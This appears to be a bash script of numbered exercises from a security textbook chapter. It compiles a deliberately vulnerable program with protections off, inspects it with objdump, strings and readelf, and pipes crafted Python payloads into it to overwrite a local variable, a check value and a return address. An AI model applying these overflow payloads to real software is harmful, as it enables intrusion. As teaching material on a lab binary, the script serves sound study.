#!/bin/bash

# code 32-6
echo "-----"
gcc sbof_lv.c -fno-stack-protector -no-pie -g -o sbof_lv
echo -n hoge | ./sbof_lv

# code 32-7
echo "-----"
objdump --no-show-raw-insn -M intel -d sbof_lv

# code 32-8
echo "-----"
strings -t x sbof_lv | grep user
readelf -l sbof_lv | grep "LOAD"

# code 32-9
echo "-----"
python3 -c "print('a'*0x10+'H4cked!', end='')" | ./sbof_lv

# code 32-10
echo "-----"
python3 -c "import sys; sys.stdout.buffer.write(b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00') + b'\xef\xbe\xad\xde')" | ./sbof_lv

# code 32-11
echo "-----"
strings -t x sbof_lv | grep admin
python3 -c "import sys; from struct import pack; sys.stdout.buffer.write(b'a' * 0x10 + b'H4cked!'.ljust(0x14, b'\x00') + pack('<IQ', 0xdeadbeef, 0x40204b))" | ./sbof_lv

# pythonで書き換え
stdbuf -o0 -e0 python3 ./sbof_lv.py
